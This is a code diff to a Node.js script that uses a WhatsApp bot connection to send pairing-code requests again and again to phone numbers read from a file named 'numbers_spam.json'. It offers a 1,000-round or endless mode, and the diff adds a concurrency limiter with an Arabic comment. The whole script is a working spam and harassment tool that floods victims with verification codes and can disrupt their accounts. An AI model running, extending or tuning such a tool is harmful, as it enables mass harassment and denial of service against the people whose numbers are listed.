@@ -3,6 +3,7 @@ const pino = require('pino');
 const readline = require("readline");
 const fs = require('fs');
 const { spawn } = require('child_process');
+const pLimit = require('p-limit');
 
 const question = (text) => {
     const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
@@ -39,7 +40,6 @@ async function XeonProject() {
     });
 
     let phoneNumbers = [];
-
     const loadNumbers = () => {
         const phoneNumbersData = JSON.parse(fs.readFileSync('numbers_spam.json', 'utf8'));
         phoneNumbers = Object.values(phoneNumbersData).flat();
@@ -48,11 +48,12 @@ async function XeonProject() {
     loadNumbers();
 
     const option = await Promise.race([
-        question(''),
+        question('Choose an option:\n1. 1000\n2. Unlimited\nEnter your choice (1 or 2): '),
         new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
     ]);
 
     let count = 0;
+    const limit = pLimit(5); // تعيين حد لعدد الطلبات المتزامنة
 
     const intervalId = setInterval(() => {
         loadNumbers();
@@ -78,12 +79,16 @@ async function XeonProject() {
         if (option === '1') {
             const xeonCodes = 1000;
             for (let i = 0; i < xeonCodes; i++) {
-                const promises = phoneNumbers.map(phoneNumber => sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes));
+                const promises = phoneNumbers.map(phoneNumber => 
+                    limit(() => sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes))
+                );
                 await Promise.all(promises);
             }
         } else {
             while (true) {
-                const promises = phoneNumbers.map(phoneNumber => sendPairingCode(XeonBotInc, phoneNumber, ++count));
+                const promises = phoneNumbers.map(phoneNumber => 
+                    limit(() => sendPairingCode(XeonBotInc, phoneNumber, ++count))
+                );
                 await Promise.all(promises);
             }
         }
